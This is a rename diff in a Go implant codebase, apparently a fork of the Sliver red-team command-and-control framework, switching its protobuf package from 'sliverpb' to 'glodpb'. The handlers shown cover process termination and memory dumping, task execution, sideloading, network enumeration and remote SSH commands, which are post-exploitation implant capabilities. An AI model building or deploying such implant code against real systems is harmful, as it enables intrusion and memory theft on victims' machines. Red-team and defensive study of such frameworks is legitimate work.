@@ -34,7 +34,7 @@ import (
 	"github.com/starkzarn/glod/implant/sliver/shell/ssh"
 	"github.com/starkzarn/glod/implant/sliver/taskrunner"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 
 	"google.golang.org/protobuf/proto"
 )
@@ -44,7 +44,7 @@ import (
 // ------------------------------------------------------------------------------------------
 func terminateHandler(data []byte, resp RPCResponse) {
 
-	terminateReq := &sliverpb.TerminateReq{}
+	terminateReq := &glodpb.TerminateReq{}
 	err := proto.Unmarshal(data, terminateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -66,7 +66,7 @@ func terminateHandler(data []byte, resp RPCResponse) {
 		}
 	}
 
-	data, err = proto.Marshal(&sliverpb.Terminate{
+	data, err = proto.Marshal(&glodpb.Terminate{
 		Pid: terminateReq.Pid,
 		Response: &commonpb.Response{
 			Err: errStr,
@@ -76,7 +76,7 @@ func terminateHandler(data []byte, resp RPCResponse) {
 }
 
 func dumpHandler(data []byte, resp RPCResponse) {
-	procDumpReq := &sliverpb.ProcessDumpReq{}
+	procDumpReq := &glodpb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -85,7 +85,7 @@ func dumpHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	res, err := procdump.DumpProcess(procDumpReq.Pid)
-	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	dumpResp := &glodpb.ProcessDump{Data: res.Data()}
 	if err != nil {
 		dumpResp.Response = &commonpb.Response{
 			Err: fmt.Sprintf("%v", err),
@@ -97,7 +97,7 @@ func dumpHandler(data []byte, resp RPCResponse) {
 
 func taskHandler(data []byte, resp RPCResponse) {
 	var err error
-	task := &sliverpb.TaskReq{}
+	task := &glodpb.TaskReq{}
 	err = proto.Unmarshal(data, task)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -115,7 +115,7 @@ func taskHandler(data []byte, resp RPCResponse) {
 }
 
 func sideloadHandler(data []byte, resp RPCResponse) {
-	sideloadReq := &sliverpb.SideloadReq{}
+	sideloadReq := &glodpb.SideloadReq{}
 	err := proto.Unmarshal(data, sideloadReq)
 	if err != nil {
 		return
@@ -125,7 +125,7 @@ func sideloadHandler(data []byte, resp RPCResponse) {
 	if err != nil {
 		errStr = err.Error()
 	}
-	sideloadResp := &sliverpb.Sideload{
+	sideloadResp := &glodpb.Sideload{
 		Result: result,
 		Response: &commonpb.Response{
 			Err: errStr,
@@ -144,17 +144,17 @@ func ifconfigHandler(_ []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func ifconfig() *sliverpb.Ifconfig {
+func ifconfig() *glodpb.Ifconfig {
 	netInterfaces, err := net.Interfaces()
 	if err != nil {
 		return nil
 	}
 
-	interfaces := &sliverpb.Ifconfig{
-		NetInterfaces: []*sliverpb.NetInterface{},
+	interfaces := &glodpb.Ifconfig{
+		NetInterfaces: []*glodpb.NetInterface{},
 	}
 	for _, iface := range netInterfaces {
-		netIface := &sliverpb.NetInterface{
+		netIface := &glodpb.NetInterface{
 			Index: int32(iface.Index),
 			Name:  iface.Name,
 		}
@@ -173,7 +173,7 @@ func ifconfig() *sliverpb.Ifconfig {
 }
 
 func netstatHandler(data []byte, resp RPCResponse) {
-	netstatReq := &sliverpb.NetstatReq{}
+	netstatReq := &glodpb.NetstatReq{}
 	err := proto.Unmarshal(data, netstatReq)
 	if err != nil {
 		//{{if .Config.Debug}}
@@ -182,8 +182,8 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	result := &sliverpb.Netstat{}
-	entries := make([]*sliverpb.SockTabEntry, 0)
+	result := &glodpb.Netstat{}
+	entries := make([]*glodpb.SockTabEntry, 0)
 
 	if netstatReq.UDP {
 		if netstatReq.IP4 {
@@ -248,8 +248,8 @@ func netstatHandler(data []byte, resp RPCResponse) {
 	}
 }
 
-func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
-	entries := make([]*sliverpb.SockTabEntry, 0)
+func buildEntries(proto string, s []netstat.SockTabEntry) []*glodpb.SockTabEntry {
+	entries := make([]*glodpb.SockTabEntry, 0)
 	for _, e := range s {
 		var (
 			pid  int32
@@ -259,12 +259,12 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 			pid = int32(e.Process.Pid)
 			exec = e.Process.Name
 		}
-		entries = append(entries, &sliverpb.SockTabEntry{
-			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
+		entries = append(entries, &glodpb.SockTabEntry{
+			LocalAddr: &glodpb.SockTabEntry_SockAddr{
 				Ip:   e.LocalAddr.IP.String(),
 				Port: uint32(e.LocalAddr.Port),
 			},
-			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
+			RemoteAddr: &glodpb.SockTabEntry_SockAddr{
 				Ip:   e.RemoteAddr.IP.String(),
 				Port: uint32(e.RemoteAddr.Port),
 			},
@@ -282,7 +282,7 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 }
 
 func runSSHCommandHandler(data []byte, resp RPCResponse) {
-	commandReq := &sliverpb.SSHCommandReq{}
+	commandReq := &glodpb.SSHCommandReq{}
 	err := proto.Unmarshal(data, commandReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -301,7 +301,7 @@ func runSSHCommandHandler(data []byte, resp RPCResponse) {
 		commandReq.Realm,
 		commandReq.Command,
 	)
-	commandResp := &sliverpb.SSHCommand{
+	commandResp := &glodpb.SSHCommand{
 		Response: &commonpb.Response{},
 		StdOut:   stdout,
 		StdErr:   stderr,
